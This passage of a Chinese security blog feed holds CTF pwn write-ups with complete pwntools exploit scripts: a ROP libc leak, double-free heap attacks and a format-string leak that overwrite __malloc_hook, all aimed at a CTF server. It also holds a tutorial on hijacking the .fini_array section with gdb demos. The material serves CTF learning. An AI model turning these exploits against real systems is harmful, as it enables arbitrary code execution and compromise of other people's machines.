class="line"></span><br><span class="line">payload = &apos;b&apos;*offest+p64(bss_addr+offest)+p64(0x400703)+p64(elf.got[&quot;read&quot;])+p64(elf.sym[&quot;puts&quot;])+p64(0x400626)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">leak=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_addr=leak-libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Tell me what you want\n&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(0)+p64(libc_addr+0x4526a)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">payload=&apos;b&apos;*0x10</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">print offest</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line">#p.close()</span><br><span class="line">except:</span><br><span class="line">offest=offest+1</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h2><p>flag已经被写到bss段内，用double free漏洞申请堆块到bss段，然后输出堆块内容即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./excited&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,6484)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./excited&apos;)</span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;a&apos;*0x8,0x50,&apos;\x10&apos;*0x8)</span><br><span class="line">new(0x60,&apos;b&apos;*0x8,0x50,&apos;\x11&apos;*0x8)</span><br><span class="line">new(0x60,&apos;c&apos;*0x8,0x50,&apos;\x12&apos;*0x8)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">bss_addr=0x6020A8</span><br><span class="line">new(0x50,p64(bss_addr-0x10),0x50,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x50,&apos;\x16&apos;*4,0x50,&apos;\x17&apos;*1)</span><br><span class="line">show(1)</span><br><span class="line">print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-interesting"><a href="#Some-thing-interesting" class="headerlink" title="Some_thing_interesting"></a>Some_thing_interesting</h2><p>格式化字符漏洞泄露libc基址，然后double free修改malloc_hook为onegadget</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./interested&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3041)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./interested&apos;)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def edit(index,cont,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line">def check():</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">#info(p.recv(49))</span><br><span class="line">#leak=int(p.recv(12),16)</span><br><span class="line">p.recvline()</span><br><span class="line">leak=int(p.recvline()[31:43],16)</span><br><span class="line">print hex(leak)</span><br><span class="line">pause()</span><br><span class="line">return leak</span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(&apos;OreOOrereOOreO%17$p&apos;)</span><br><span class="line"></span><br><span class="line">libc_addr=check()-0x20830</span><br><span class="line"></span><br><span class="line">new(0x40,&apos;a&apos;*0x8,0x60,&apos;\x10&apos;*0x8) #1</span><br><span class="line">new(0x40,&apos;b&apos;*0x8,0x60,&apos;\x11&apos;*0x8) #2</span><br><span class="line">new(0x40,&apos;c&apos;*0x8,0x60,&apos;\x12&apos;*0x8) #3</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">new(0x60,p64(libc_addr+libc.sym[&quot;__malloc_hook&quot;]-0x23),0x60,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;\x16&apos;*4,0x60,&apos;\x1f&apos;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BFnote"><a href="#BFnote" class="headerlink" title="BFnote"></a>BFnote</h2><p>一个栈溢出，然后在bss上写值，申请任意大小的chunk，以chunk为基址进行任意偏移写</p><p>栈溢出被canary拦住了，预期解是通过申请很大的chunk，会mmap到libc附近地址，接着通过偏移改写TLS中的canary，接着就是常规ROP的操作了，可以ret2dlresolve，也可以爆破1/4096直接改写got表为system，调用即可。还看到了另一位师傅的wp，使用mprotect改bss可执行，写入shellcode就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;force&quot;&gt;&lt;a href=&quot;#force&quot; class=&quot;headerlink&quot; title=&quot;force&quot;&gt;&lt;/a&gt;force&lt;/h2&gt;&lt;p&gt;标准的house of force，先申请较大的内存页，可泄露出libc基址，&lt;br&gt;然后申请较小堆块，溢出修改to
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>.fini_array段劫持</title>
    <link href="https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/"/>
    <id>https://nocbtm.github.io/2020/02/20/-fini-array段劫持/</id>
    <published>2020-02-20T08:47:00.000Z</published>
    <updated>2020-04-13T02:59:51.793Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:</p><p> <a href="https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/</a></p><p><a href="https://r0co.top/passages/利用LD-PRELOAD-HOOK系统内置函数/" target="_blank" rel="noopener">https://r0co.top/passages/%E5%88%A9%E7%94%A8LD-PRELOAD-HOOK%E7%B3%BB%E7%BB%9F%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://blog.csdn.net/chen_jianjian/article/details/80627693" target="_blank" rel="noopener">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。</p><h2 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo 1"></a>Demo 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc为函数提供了几种类型的属性，其中两个是我们特别感兴趣的：构造函数(constructors)和析构函数(destructors)。程序员应当使用类似下面的方式来指定这些属性：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br></pre></td></tr></table></figure><p>带有”构造函数”属性的函数将在main()函数之前被执行，而声明为”析构函数”属性的函数则将在<em>after</em> main()退出时执行。</p><p>程序运行结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test.c -o test</span><br><span class="line">➜  fini_array ls</span><br><span class="line">test  test.c</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">hello world!</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br></pre></td></tr></table></figure></p><p>下载我们试试 objdump -h ./test</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test</span><br><span class="line">18 .init_array   00000010  0000000000600e00  0000000000600e00  00000e00  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000010  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e00 , .fini_array的地址为 0x600e10</p><p>在gdb中分别对这两个地址跟踪一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xg 0x600e00</span><br><span class="line">0x600e00:0x00000000004005400x00000000004005a4</span><br><span class="line">0x600e10:0x00000000004005200x00000000004005b5</span><br></pre></td></tr></table></figure><p>分析一下结果<br>.init_array存的 0x400540是 frame_dummy函数地址(ida里面可查看) 0x4005a4很明显是自己定义的start函数的地址</p><p>.fini_array存的 0x400540是 __do_global_dtors_aux函数地址(ida里面可查看) 0x4005b5 很明显是定义的stop函数的地址</p><h2 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo 2"></a>Demo 2</h2><p>我们再看一个例子,其实就是前面的test程序函数少了属性，我把它定义成静态函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样编译和运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test2.c -o test</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br></pre></td></tr></table></figure><p>函数地址并没有变化，但是因为start/stop函数未设定析构与构造属性，所以没有在开始和结束时被调用。</p><p>我们试试 objdump -h ./test2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test2</span><br><span class="line">18 .init_array   00000008  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000008  0000000000600e18  0000000000600e18  00000e18  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e10 , .fini_array的地址为 0x600e18，和test程序有点偏差。</p><p>现在我用gdb跟踪一波，查看一下.fini_array</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2xg 0x600e18</span><br><span class="line">0x600e18:    0x0000000000400530    0x0000000000000000</span><br></pre></td></tr></table></figure><p>明显0x0000000000400530后面的函数指针没有被填充 是0x0000000000000000，所以程序结束后不会执行stop函数</p><p>现在我们控制程序执行流程，怎么控制呢？我把.fini_array的函数指针0x0000000000400530覆盖成stop函数的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set &#123;int&#125;0x600e18=0x4005b5</span><br><span class="line">pwndbg&gt; x/2xg 0x600e18 </span><br><span class="line">0x600e18:    0x00000000004005b5    0x0000000000000000</span><br></pre></td></tr></table></figure><p>输入c继续执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br><span class="line">[Inferior 1 (process 7442) exited normally]</span><br></pre></td></tr></table></figure><p>成功执行了stop函数，如果stop函数是一段onegadget或shellcode我们就可以直接拿下shell</p><h2 id="分析与总结"><a href="#分析与总结" class="headerlink" title="分析与总结"></a>分析与总结</h2><p>我们来关心一下，上面的stop在什么地方被调用。</p><p>栈回溯跟踪看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x4005b5 &lt;stop&gt;                 push   rbp</span><br><span class="line">   0x4005b6 &lt;stop+1&gt;               mov    rbp, rsp</span><br><span class="line">   0x4005b9 &lt;stop+4&gt;               mov    edi, 0x40067a</span><br><span class="line">   0x4005be &lt;stop+9&gt;               call   puts@plt &lt;0x400430&gt;</span><br><span class="line"> </span><br><span class="line">   0x4005c3 &lt;stop+14&gt;              nop    </span><br><span class="line">   0x4005c4 &lt;stop+15&gt;              pop    rbp</span><br><span class="line">   0x4005c5 &lt;stop+16&gt;              ret    </span><br><span class="line"> </span><br><span class="line">   0x4005c6                        nop    word ptr cs:[rax + rax]</span><br><span class="line">   0x4005d0 &lt;__libc_csu_init&gt;      push   r15</span><br><span class="line">   0x4005d2 &lt;__libc_csu_init+2&gt;    push   r14</span><br><span class="line">   0x4005d4 &lt;__libc_csu_init+4&gt;    mov    r15d, edi</span><br><span class="line">───────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdc68 —▸ 0x7ffff7de7df7 (_dl_fini+823) ◂— test   r13d, r13d</span><br><span class="line">01:0008│ r14  0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdc78 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffa000 ◂— jg     0x7ffff7ffa047</span><br><span class="line">03:0018│      0x7fffffffdc80 —▸ 0x7ffff7fb5000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047</span><br><span class="line">04:0020│ r10  0x7fffffffdc88 —▸ 0x7ffff7ffd9d8 (_rtld_global+2456) —▸ 0x7ffff7dd7000 ◂— jg     0x7ffff7dd7047</span><br><span class="line">05:0028│      0x7fffffffdc90 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde50 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffdc98 —▸ 0x7ffff7de7b44 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]</span><br><span class="line">07:0038│      0x7fffffffdca0 —▸ 0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0           4005b5 stop</span><br><span class="line">   f 1     7ffff7de7df7 _dl_fini+823</span><br><span class="line">   f 2     7ffff7a46ff8 __run_exit_handlers+232</span><br><span class="line">   f 3     7ffff7a47045</span><br><span class="line">   f 4     7ffff7a2d837 __libc_start_main+247</span><br><span class="line">Breakpoint *0x4005b5</span><br><span class="line">Breakpoint *0x4005B5</span><br></pre></td></tr></table></figure><p>看到返回地址在_dl_fini+823，所以可以得出结论，.fini_array区节的第一个函数指针在程序结束时，由_dl_fini函数调用，所以我们可加以利用。在未开启PIE的情况下，只需实现一个任意地址写，将.fini_array区节的第一个函数指针改写成后门地址或者one_gadgets，在程序结束时便能控制流程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>记一次家庭局域网渗透经历</title>
    <link href="https://nocbtm.github.io/2020/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/"/>
    <id>https://nocbtm.github.io/2020/02/03/记一次家庭局域网渗透经历/</id>
    <published>2020-02-03T07:17:00.000Z</published>
    <updated>2020-04-16T07:38:28.157Z</updated>
    
